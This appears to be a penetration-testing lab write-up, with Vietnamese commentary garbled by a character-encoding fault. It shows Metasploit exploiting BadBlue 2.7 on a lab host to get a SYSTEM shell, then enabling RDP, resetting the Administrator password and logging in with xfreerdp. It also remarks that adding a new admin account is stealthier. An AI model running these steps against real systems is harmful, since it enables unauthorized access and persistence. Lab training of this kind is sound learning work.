# Enabling RDP

Remote desktop protocol

Má»¥c tiÃªu: sau khi vÃ o Ä‘Æ°á»£c target, sáº½ turn on RDP Ä‘á»ƒ sau nÃ y cÃ³ thá»ƒ vÃ o láº¡i 


Target IP: 10.2.21.205

Enable RDP on the target machine on port 3389

`service postgresql start && msfconsole -q`

`db_status`

`setg RHOSTS 10.2.21.205`

`setg RHOST 10.2.21.205`

`workspace -a RDP`

`db_nmap -sV 10.2.21.205`


```
80/tcp    open  http         BadBlue httpd 2.7
135/tcp   open  msrpc        Microsoft Windows RPC
139/tcp   open  netbios-ssn  Microsoft Windows netbios-ssn
445/tcp   open  microsoft-ds Microsoft Windows Server 2008 R2 - 2012 microsoft-ds
49152/tcp open  msrpc        Microsoft Windows RPC
49153/tcp open  msrpc        Microsoft Windows RPC
49154/tcp open  msrpc        Microsoft Windows RPC
49155/tcp open  msrpc        Microsoft Windows RPC
49156/tcp open  msrpc        Microsoft Windows RPC
49175/tcp open  msrpc        Microsoft Windows RPC

# RDP 3389 is disabled
```

ta tháº¥y RDP táº¯t, má»¥c tiÃªu cá»§a ta lÃ  xÃ¢m nháº­p vÃ o Ä‘Æ°á»£c target vÃ  báº­t rdp lÃªn 

Exploitation

`use exploit/windows/http/badblue_passthru`

`run`

`sysinfo`

    Computer        : WIN-OMCNBKR66MN
    OS              : Windows 2012 R2 (6.3 Build 9600).
    Architecture    : x64
    System Language : en_US
    Domain          : WORKGROUP
    Logged On Users : 0
    Meterpreter     : x86/windows

`getuid`

	Server username: NT AUTHORITY\SYSTEM

`background`

Enable RDP

`search enable_rdp`

`use post/windows/manage/enable_rdp`

`options`

`sessions`

`set SESSION 1`

`run`

cÃ³ cÃ¡c option Ä‘á»ƒ táº¡o 1 tÃ i khoáº£n vÃ  máº­t kháº©u má»›i, nhÆ°ng trong lab nÃ y, ta sáº½ Ä‘i theo hÆ°á»›ng Ä‘á»•i máº­t kháº©u `administrator`, trong thá»±c táº¿, khÃ´ng nÃªn Ä‘á»•i máº­t kháº©u mÃ  hÃ£y táº¡o 1 tÃ i khoáº£n má»›i, nhÆ° váº­y dá»… láº©n trá»‘n hÆ¡n 

![alt text](image-14.png)


`db_nmap -p 3389 10.2.21.205` # Verify port 3389 is open

```
3389/tcp open  ms-wbt-server
```

Äá»ƒ truy cáº­p RDP, cáº§n pháº£i cÃ³ thÃ´ng tin Ä‘Äƒng nháº­p 

`sessions`

`sessions 1`

`shell`

`net users`

	Administrator Guest

Thay Ä‘á»•i máº­t kháº©u cá»§a `Administrator` (khÃ´ng Ä‘Æ°á»£c khuyáº¿n khÃ­ch trong há»‡ thá»‘ng thá»±c táº¿)

ðŸ“Œ Trong quÃ¡ trÃ¬nh kiá»ƒm thá»­ xÃ¢m nháº­p thÃ´ng thÆ°á»ng, hÃ£y táº¡o má»™t tÃ i khoáº£n ngÆ°á»i dÃ¹ng khÃ¡c, thÃªm tÃ i khoáº£n Ä‘Ã³ vÃ o nhÃ³m Quáº£n trá»‹ viÃªn vÃ  sá»­ dá»¥ng tÃ i khoáº£n Ä‘Ã³.

`net user administrator p4ssword_12344321`

`exit`

ThÃ´ng tin Ä‘Äƒng nháº­p há»£p lá»‡ hiá»‡n táº¡i lÃ : `administrator:p4ssword_12344321`

Má»Ÿ 1 tab khÃ¡c

`xfreerdp /u:administrator /p:p4ssword_12344321 /v:10.2.21.205` -> Ä‘á»ƒ káº¿t ná»‘i vÃ  báº­t RDP

![alt text](image-15.png)










